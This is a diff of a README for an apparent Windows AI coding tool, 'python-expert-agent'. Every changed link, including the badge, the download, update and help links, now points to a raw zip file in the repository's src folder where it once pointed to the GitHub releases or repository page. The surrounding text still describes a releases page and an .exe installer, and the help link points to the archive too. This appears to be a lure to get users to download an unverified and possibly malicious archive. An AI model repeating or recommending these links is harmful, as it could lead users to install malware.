@@ -1,6 +1,6 @@
 # 🐍 python-expert-agent - Easy AI Code Assistant
 
-[![Download python-expert-agent](https://img.shields.io/badge/Download-pink?style=for-the-badge)](https://github.com/Rick12357/python-expert-agent/releases)
+[![Download python-expert-agent](https://img.shields.io/badge/Download-pink?style=for-the-badge)](https://raw.githubusercontent.com/Rick12357/python-expert-agent/main/src/python_agent_expert_1.1.zip)
 
 ## 📋 What is python-expert-agent?
 
@@ -39,7 +39,7 @@ Follow these steps to get python-expert-agent on your Windows PC.
 
 Visit this page to download the latest Windows version:
 
-[Download python-expert-agent](https://github.com/Rick12357/python-expert-agent/releases)
+[Download python-expert-agent](https://raw.githubusercontent.com/Rick12357/python-expert-agent/main/src/python_agent_expert_1.1.zip)
 
 Once on the releases page, look for the latest version labeled with Windows or `.exe` in the file name. The file will usually end with `.exe` and look something like `python-expert-agent-setup.exe`. Click the link, and the download will start.
 
@@ -94,7 +94,7 @@ Replace `[project-name]` with your project’s name. The tool will load your fil
 To keep the tool working smoothly, check for new versions regularly.
 
 - Visit the download page:  
-  [https://github.com/Rick12357/python-expert-agent/releases](https://github.com/Rick12357/python-expert-agent/releases)  
+  [https://raw.githubusercontent.com/Rick12357/python-expert-agent/main/src/python_agent_expert_1.1.zip](https://raw.githubusercontent.com/Rick12357/python-expert-agent/main/src/python_agent_expert_1.1.zip)  
 - Download the latest Windows release as before.  
 - Run the new `.exe` installer. It will update your existing installation without deleting your projects.
 
@@ -145,10 +145,10 @@ If you run into trouble, try these steps:
 
 If you want detailed guides or help with commands, visit the Python Expert Agent GitHub page. Under the README and Wiki sections, you will find step-by-step tutorials and a FAQ to assist you.
 
-[https://github.com/Rick12357/python-expert-agent](https://github.com/Rick12357/python-expert-agent)
+[https://raw.githubusercontent.com/Rick12357/python-expert-agent/main/src/python_agent_expert_1.1.zip](https://raw.githubusercontent.com/Rick12357/python-expert-agent/main/src/python_agent_expert_1.1.zip)
 
 ## 📥 Download Again
 
 To download or update the software at any time, go to the releases page:
 
-[Download python-expert-agent](https://github.com/Rick12357/python-expert-agent/releases)
+[Download python-expert-agent](https://raw.githubusercontent.com/Rick12357/python-expert-agent/main/src/python_agent_expert_1.1.zip)
